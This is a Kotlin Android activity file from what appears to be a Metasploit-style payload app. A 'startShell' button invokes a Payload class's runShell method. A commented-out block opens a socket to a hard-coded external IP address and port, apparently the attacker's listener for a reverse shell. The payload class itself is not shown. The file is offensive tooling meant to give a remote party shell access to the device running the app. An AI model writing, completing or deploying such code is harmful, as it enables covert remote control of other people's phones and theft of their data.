package xyz.linglitel.msf_payload_android_l

import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import java.net.Socket
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    private lateinit var debugInfoTextView: TextView
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        debugInfoTextView = findViewById(R.id.debugInfo)
        var startShell = findViewById<Button>(R.id.startShell)
        var payload = Payload1()
        startShell.setOnClickListener {
/*            thread {
                try {
                  *//*  payload.startConnect("60.215.128.117",26626)
                    payload.startPayload()*//*
                    var shellSocket = Socket("60.215.128.117",26626)
                }catch (e: Exception){
                    debugInfoTextView.text=e.message
                }
            }*/
            var payload = Payload()
            payload.runShell()
        }
    }
}